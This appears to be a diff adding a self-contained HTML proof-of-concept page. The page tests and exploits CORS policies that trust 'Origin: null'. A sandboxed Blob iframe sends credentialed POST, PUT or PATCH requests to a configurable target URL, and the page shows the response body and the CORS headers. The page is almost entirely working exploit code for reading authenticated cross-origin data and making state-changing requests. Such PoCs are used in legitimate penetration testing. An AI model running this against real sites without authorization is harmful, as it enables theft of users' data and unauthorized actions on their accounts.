@@ -1,0 +1,101 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS PoC — Origin:null + Methods (no exfil)</title>
+<style>
+  body{font:14px/1.5 system-ui;margin:24px}
+  textarea,input,select{width:100%;max-width:920px}
+  pre{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;border-radius:8px}
+  .row{max-width:960px}
+  .err{color:#b00}
+</style>
+
+<h1>CORS PoC — <code>Origin: null</code> + PUT/PATCH/POST (Blob iframe)</h1>
+<div class="row">
+  <label>URL <input id="url" value="https://target.example.com/resource"></label><br>
+  <label>Method
+    <select id="method"><option>POST</option><option>PUT</option><option>PATCH</option></select>
+  </label><br>
+  <label>Request headers (name: value per line)
+    <textarea id="hdrs" rows="4">Content-Type: application/json</textarea>
+  </label><br>
+  <label>Body
+    <textarea id="body" rows="6">{"probe":true}</textarea>
+  </label><br>
+  <label><input type="checkbox" id="creds" checked> Use cookies</label>
+  <button id="run">Run</button>
+</div>
+
+<h2>Result</h2>
+<div id="meta"></div>
+<pre id="out">(no run yet)</pre>
+
+<script>
+(function(){
+  function $(id){return document.getElementById(id);}
+  function esc(s){return String(s).replace(/[&<>]/g,function(m){return {'&':'&amp;','<':'&lt;','>':'&gt;'}[m];});}
+
+  window.addEventListener('message', function(evt){
+    var d = evt.data || {};
+    if (typeof d !== 'object' || !('ok' in d)) return;
+    if (!d.ok){
+      $('out').classList.add('err'); $('out').textContent = 'Error: ' + d.error; return;
+    }
+    $('meta').innerHTML =
+      '<p><strong>Request Origin:</strong> <code>null</code> (sandboxed Blob)'+
+      '<br><strong>Status:</strong> '+d.status+
+      '<br><strong>ACAO:</strong> '+esc(d.acao)+
+      ' &nbsp; <strong>ACAC:</strong> '+esc(d.acac)+
+      '<br><strong>ACAM:</strong> '+esc(d.acam)+
+      '<br><strong>ACAH:</strong> '+esc(d.acah)+'</p>';
+    $('out').textContent = d.body;
+  });
+
+  $('run').onclick = function(){
+    var target = $('url').value.trim();
+    var method = $('method').value;
+    var creds  = $('creds').checked;
+    var hdrLines = $('hdrs').value.split(/\r?\n/).map(function(l){return l.trim();}).filter(Boolean);
+    var headers = {};
+    for (var i=0;i<hdrLines.length;i++){
+      var m = hdrLines[i].split(':'); if (m.length>=2) headers[m[0].trim()] = m.slice(1).join(':').trim();
+    }
+    var body = $('body').value;
+
+    $('meta').innerHTML =
+      '<p><strong>Parent origin:</strong> '+esc(location.origin)+
+      '<br><strong>Target:</strong> '+esc(target)+
+      '<br><strong>Method:</strong> '+esc(method)+
+      ' &nbsp; <strong>Credentials:</strong> '+creds+'</p>';
+    $('out').textContent = 'Fetching…';
+
+    // Build child HTML (no backticks)
+    var hdrJSON = JSON.stringify(headers);
+    var html =
+      '<!doctype html><meta charset="utf-8">' +
+      '<script>(function(){' +
+      'var url=' + JSON.stringify(target) + ';' +
+      'var method=' + JSON.stringify(method) + ';' +
+      'var useC=' + (creds ? 'true' : 'false') + ';' +
+      'var headers=' + hdrJSON + ';' +
+      'var body=' + JSON.stringify(body) + ';' +
+      'fetch(url,{mode:"cors",credentials:(useC?"include":"omit"),method:method,headers:headers,body:body})' +
+      '.then(function(r){return r.text().then(function(txt){' +
+      '  var acao=r.headers.get("access-control-allow-origin");' +
+      '  var acac=r.headers.get("access-control-allow-credentials");' +
+      '  var acam=r.headers.get("access-control-allow-methods");' +
+      '  var acah=r.headers.get("access-control-allow-headers");' +
+      '  parent.postMessage({ok:true,status:r.status,acao:acao,acac:acac,acam:acam,acah:acah,body:txt},"*");' +
+      '});}).catch(function(e){parent.postMessage({ok:false,error:String(e)},"*");});' +
+      '})();<\/script>';
+
+    var blob = new Blob([html], {type:'text/html'});
+    var url  = URL.createObjectURL(blob);
+
+    var ifr = document.createElement('iframe');
+    ifr.setAttribute('sandbox','allow-scripts'); // no allow-same-origin => Origin:null
+    ifr.style.display = 'none';
+    ifr.src = url;
+    document.body.appendChild(ifr);
+  };
+})();
+</script>
